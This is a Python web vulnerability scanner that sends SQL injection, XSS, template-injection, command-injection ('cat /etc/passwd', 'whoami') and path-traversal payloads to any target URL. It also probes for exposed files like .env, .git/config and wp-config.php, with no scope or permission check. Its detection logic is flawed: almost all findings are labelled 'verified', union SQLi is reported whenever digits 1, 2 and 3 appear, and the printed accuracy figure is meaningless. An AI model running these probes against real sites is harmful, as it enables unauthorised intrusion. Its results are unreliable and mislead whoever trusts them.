#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ULTIMATE VULNERABILITY SCANNER - ELITE EDITION
Advanced detection for SQLi, XSS, and critical web vulnerabilities
Author: Security Research Team
Version: 5.0 ULTIMATE
"""

import requests
import re
import json
import time
import random
import argparse
import os
import sys
from urllib.parse import urlparse, quote
from colorama import Fore, Style, init
import urllib3
import warnings

# Configuration
urllib3.disable_warnings()
warnings.filterwarnings("ignore")
init(autoreset=True)

CONFIG = {
    'timeout': 15,
    'user_agents': [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ]
}

# ADVANCED PAYLOADS DATABASE
PAYLOADS = {
    'sql_error': [
        "'", "''", "`", "\"", "' OR '1'='1", "' OR 1=1--", 
        "' UNION SELECT 1,2,3--", "' AND 1=1--"
    ],
    'sql_time': [
        "' AND SLEEP(5)--", "' OR SLEEP(5)--", 
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ],
    'sql_union': [
        "' UNION SELECT null,null,null--",
        "' UNION SELECT @@version,2,3--",
        "' UNION SELECT database(),user(),version()--"
    ],
    'xss_basic': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)"
    ],
    'xss_advanced': [
        "'\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "{{7*7}}",  # Template Injection
        "${7*7}"    # Expression Language
    ],
    'command_injection': [
        "; whoami", "| id", "&& cat /etc/passwd",
        "'; cat /etc/passwd #", '`id`'
    ],
    'path_traversal': [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../etc/passwd%00"
    ]
}

def display_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(Fore.RED + r"""
    ╦  ╦┌─┐┬  ┌─┐  ╔╦╗┌─┐┬─┐┌─┐┌─┐┌┬┐┌─┐┬─┐
    ╚╗╔╝├┤ │  ├┤    ║ │ │├┬┘├┤ ├─┤ │ ├┤ ├┬┘
     ╚╝ └─┘┴─┘└─┘   ╩ └─┘┴└─└─┘┴ ┴ ┴ └─┘┴└─
    """ + Fore.CYAN + "     Ultimate Vulnerability Scanner v5.0" + Style.RESET_ALL)
    print()

def info(msg): print(Fore.BLUE + "[i] " + msg)
def success(msg): print(Fore.GREEN + "[+] " + msg)  
def warning(msg): print(Fore.YELLOW + "[!] " + msg)
def error(msg): print(Fore.RED + "[x] " + msg)

# Results storage
results = []

def add_vuln(title, risk, description, url, payload="", evidence=""):
    vuln = {
        'title': title, 'risk': risk, 'description': description,
        'url': url, 'payload': payload, 'evidence': evidence,
        'verified': bool(evidence)
    }
    results.append(vuln)
    
    status = "✅" if vuln['verified'] else "⚠️"
    color = Fore.RED if risk == "High" and vuln['verified'] else Fore.YELLOW
    print(f"{status} {color}[{risk}] {title}")

def advanced_request(url, method="GET", data=None):
    try:
        headers = {'User-Agent': random.choice(CONFIG['user_agents'])}
        if method.upper() == "GET":
            return requests.get(url, headers=headers, timeout=CONFIG['timeout'], verify=False)
        else:
            return requests.post(url, data=data, headers=headers, timeout=CONFIG['timeout'], verify=False)
    except:
        return None

# 🎯 ENHANCED SQL INJECTION DETECTION
def scan_sql_injection_ultimate(url):
    info("Launching ULTIMATE SQL Injection Scan...")
    
    baseline = advanced_request(url)
    if not baseline: return
    
    parameters = ['id', 'user', 'search', 'q', 'category', 'product', 'page']
    
    for param in parameters:
        # Test Error-Based SQLi
        for payload in PAYLOADS['sql_error']:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response:
                # STRICT SQL ERROR DETECTION
                sql_errors = [
                    "mysql_fetch_array", "mysql_num_rows", "mysql_result", 
                    "ORA-", "PostgreSQL", "SQLite3", "SQL syntax", 
                    "Microsoft OLE DB", "ODBC Driver", "Unclosed quotation",
                    "Fatal error", "Warning:", "mysql_", "pg_", "oci_"
                ]
                
                for error_msg in sql_errors:
                    if error_msg.lower() in response.text.lower():
                        add_vuln(
                            "SQL Injection - Error Based", "Critical",
                            f"SQL error detected in parameter '{param}'",
                            test_url, payload, f"Error: {error_msg}"
                        )
                        break
        
        # Test Time-Based SQLi
        for payload in PAYLOADS['sql_time']:
            test_url = f"{url}?{param}={quote(payload)}"
            start_time = time.time()
            response = advanced_request(test_url)
            response_time = time.time() - start_time
            
            if response_time > 4 and response:
                add_vuln(
                    "SQL Injection - Time Based", "High", 
                    f"Time delay detected ({response_time:.2f}s)",
                    test_url, payload, f"Delay: {response_time:.2f}s"
                )
        
        # Test Union-Based SQLi
        for payload in PAYLOADS['sql_union']:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response:
                # Check for union indicators
                if ("1" in response.text and "2" in response.text and "3" in response.text) or \
                   ("null" in response.text.lower()):
                    add_vuln(
                        "SQL Injection - Union Based", "High",
                        f"Union injection possible in '{param}'", 
                        test_url, payload, "Union select detected"
                    )

# 🎯 ENHANCED XSS DETECTION
def scan_xss_ultimate(url):
    info("Launching ULTIMATE XSS Scan...")
    
    parameters = ['q', 'search', 'name', 'message', 'comment', 'email', 'user']
    
    for param in parameters:
        for payload in PAYLOADS['xss_basic'] + PAYLOADS['xss_advanced']:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response:
                # SMART XSS DETECTION - Not just string matching
                payload_clean = payload.replace('<', '').replace('>', '').replace('"', '')
                
                # Check if payload is reflected without encoding
                if payload in response.text:
                    add_vuln(
                        "Cross-Site Scripting (XSS)", "High",
                        f"XSS payload reflected in parameter '{param}'",
                        test_url, payload, "Payload reflected without encoding"
                    )
                # Check for partial reflection
                elif payload_clean in response.text:
                    add_vuln(
                        "Potential XSS - Partial Reflection", "Medium", 
                        f"XSS payload partially reflected in '{param}'",
                        test_url, payload, "Payload partially reflected"
                    )

# 🎯 COMMAND INJECTION DETECTION
def scan_command_injection(url):
    info("Scanning for Command Injection...")
    
    parameters = ['cmd', 'command', 'exec', 'execute', 'system', 'run']
    
    for param in parameters:
        for payload in PAYLOADS['command_injection']:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response:
                # Check for command output indicators
                cmd_indicators = [
                    "root", "uid=", "gid=", "groups=", "/bin/bash",
                    "www-data", "apache", "nginx", "administrator"
                ]
                
                for indicator in cmd_indicators:
                    if indicator in response.text:
                        add_vuln(
                            "Command Injection", "Critical",
                            f"Command injection in parameter '{param}'",
                            test_url, payload, f"System output: {indicator}"
                        )
                        break

# 🎯 PATH TRAVERSAL DETECTION
def scan_path_traversal(url):
    info("Scanning for Path Traversal...")
    
    parameters = ['file', 'path', 'filename', 'document', 'template']
    
    for param in parameters:
        for payload in PAYLOADS['path_traversal']:
            test_url = f"{url}?{param}={quote(payload)}"
            response = advanced_request(test_url)
            
            if response:
                # Check for sensitive file content
                sensitive_content = [
                    "root:", "bin/bash", "daemon:", "mysql:",
                    "Database", "password", "admin", "secret"
                ]
                
                for content in sensitive_content:
                    if content in response.text:
                        add_vuln(
                            "Path Traversal", "High",
                            f"Path traversal in parameter '{param}'", 
                            test_url, payload, f"File content: {content}"
                        )
                        break

# 🎯 SECURITY HEADERS SCAN
def scan_security_headers(url):
    info("Scanning Security Headers...")
    
    response = advanced_request(url)
    if not response: return
    
    headers_to_check = {
        'Content-Security-Policy': 'High',
        'X-Frame-Options': 'Medium', 
        'Strict-Transport-Security': 'High',
        'X-Content-Type-Options': 'Medium',
        'Referrer-Policy': 'Low'
    }
    
    for header, risk in headers_to_check.items():
        if header not in response.headers:
            add_vuln(
                f"Missing {header}", risk,
                f"Security header {header} is missing",
                url, "", "Header not present in response"
            )

# 🎯 SENSITIVE FILES DISCOVERY
def scan_sensitive_files(url):
    info("Scanning for Sensitive Files...")
    
    sensitive_files = [
        '/.env', '/.git/config', '/wp-config.php', '/config.php',
        '/.htaccess', '/robots.txt', '/backup.zip', '/database.sql',
        '/phpinfo.php', '/admin.php', '/debug.php'
    ]
    
    for file_path in sensitive_files:
        test_url = url.rstrip('/') + file_path
        response = advanced_request(test_url)
        
        if response and response.status_code == 200:
            add_vuln(
                "Sensitive File Exposure", "High",
                f"Sensitive file accessible: {file_path}",
                test_url, "", f"File size: {len(response.content)} bytes"
            )

# 🎯 MAIN SCANNER FUNCTION
def ultimate_scan(url):
    display_banner()
    info(f"Starting ULTIMATE vulnerability scan: {url}")
    print()
    
    # Reset results
    global results
    results = []
    
    # Run all scans
    scan_sql_injection_ultimate(url)
    scan_xss_ultimate(url) 
    scan_command_injection(url)
    scan_path_traversal(url)
    scan_security_headers(url)
    scan_sensitive_files(url)
    
    # Generate report
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{' ULTIMATE VULNERABILITY SCAN REPORT ':^80}")
    print(f"{'='*80}{Style.RESET_ALL}")
    
    verified = len([r for r in results if r['verified']])
    total = len(results)
    
    print(f"Target: {url}")
    print(f"Scan Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Total Findings: {total}")
    print(f"✅ Verified Vulnerabilities: {verified}")
    print(f"🎯 Accuracy: {(verified/total*100) if total > 0 else 100:.1f}%")
    
    if verified > 0:
        print(f"\n{Fore.RED}🚨 CRITICAL VULNERABILITIES:{Style.RESET_ALL}")
        for vuln in [r for r in results if r['verified'] and r['risk'] in ['Critical', 'High']]:
            print(f"\n🔴 {vuln['title']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Evidence: {vuln['evidence']}")
    
    if total == 0:
        success("No vulnerabilities detected - Target appears secure!")

def main():
    parser = argparse.ArgumentParser(description='Ultimate Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    args = parser.parse_args()
    
    url = args.url if args.url.startswith('http') else 'http://' + args.url
    ultimate_scan(url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        error("\nScan interrupted by user!")
        sys.exit(1)